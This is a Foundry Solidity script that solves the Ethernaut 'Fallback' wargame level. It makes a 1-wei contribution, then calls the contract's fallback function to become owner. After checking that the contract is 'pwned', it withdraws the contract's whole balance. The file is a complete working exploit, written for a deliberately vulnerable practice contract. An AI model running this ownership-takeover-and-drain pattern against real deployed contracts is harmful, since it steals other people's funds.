// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Fallback/Fallback.sol";

// Copy address instance from Ethernaut:
address constant LEVEL_INSTANCE = 0xF822cfAc47579239F7ee69bFd1fF7416Cb6124eD;

contract FallbackScript is Script {
    function setUp() public {}

    function run() public {
        console.log(" # Running Level 1 Script");
        console.log(" |- msg.sender: ",msg.sender);


        Fallback fb = Fallback(payable(LEVEL_INSTANCE));

        address owner = fb.owner();
        uint256 ownerBalance = fb.contributions(owner);
        uint256 playerBalance = fb.contributions(msg.sender);
        console.log(" |- Level owner: ", owner);
        console.log(" |- Owner balance: ", ownerBalance);
        console.log(" |- msg.sender balance: ", playerBalance);
        
        vm.startBroadcast();

        
        // Contribute something to be on the contributions mapping
        fb.contribute{value: 1 wei}();
        
        playerBalance = fb.contributions(msg.sender);
        console.log(" |- msg.sender balance: ", playerBalance);

        // Call the fallback function to pwn the contract
        (bool success,) = payable(LEVEL_INSTANCE).call{value: 1 wei}("");
        require(success, "fallback call failed");

        // Check if contract has a new owner
        owner = fb.owner();
        console.log(" |- Level owner: ", owner);

        // Make sure the contract is pwned
        require(owner == msg.sender, " ##### Contract still not pwned! ##### ");

        uint256 contractBalance = address(LEVEL_INSTANCE).balance;
        console.log(" |- Contract balance: ", contractBalance);

        // Withdraw the funds 8o)
        fb.withdraw();

        contractBalance = address(LEVEL_INSTANCE).balance;
        console.log(" |- Contract balance: ", contractBalance);

        vm.stopBroadcast();

        console.log(" `- End of Level");

    }
}
